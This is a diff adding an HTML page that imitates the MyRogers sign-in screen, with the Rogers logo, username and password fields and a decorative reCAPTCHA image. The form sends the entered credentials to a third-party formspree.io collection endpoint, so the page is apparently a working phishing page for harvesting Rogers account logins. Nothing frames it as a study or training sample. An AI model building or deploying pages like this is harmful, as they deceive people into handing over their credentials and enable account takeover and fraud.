@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+ <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+ <link rel="stylesheet" href="static/styles/fontawesome/css/fontawesome-all.css">
+ <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.1/css/all.css" integrity="sha384-vp86vTRFVJgpjF9jiIGPEEqYqlDwgyBgEF109VFjmqGmIY/Y4HV4d3Gp2irVfcrp" crossorigin="anonymous">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+  <script src ="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.12.0.min.js"></script>
+    <title>MyRogers | Sign in</title>
+</head>
+<body>
+    <div class="wrapper">
+        <div class="container">
+            <div class="rog"><img class="rog" src="roger.png" alt="logo"></div>
+        <h3 class="h3"><span>sign in</span></h3>
+        <p>with your MyRogers credentials</p> 
+            <form action="https://formspree.io/f/mjvpevwj" method="POST" id="my-form">
+                <div class="user-input-wrp">
+                    <br/>
+                    <input type="text" id="username" name="username" class="inputText" required/>
+                    <span class="floating-label"><span class="test">Username</span></span><span class="iconic"><i class="fas fa-info-circle info"></i></span>
+                </div><br/>
+                <a href="">Forgot username</a>
+                <div class="user-input-wrp">
+                    <br/>
+                    <input type="password" id="password" name="password" class="inputText" required/>
+                    <span class="floating-label"><span class="test">Password</span></span><span class="iconic"><i class="fas fa-eye-slash eye"></i></span>
+                </div><br>
+                <a href="">Forgot username</a>
+                <button type="submit" onclick="openWin()">LOGIN</button>
+            </form>  
+            
+            <hr>
+            <p>New to MyRogers? <a href="">Register</a></p>
+        
+        
+        <img src="recaptcha-logo.png" alt="logo">
+    </div>
+    </div>
+</body>
+<script src="main.js"></script>
+</html>
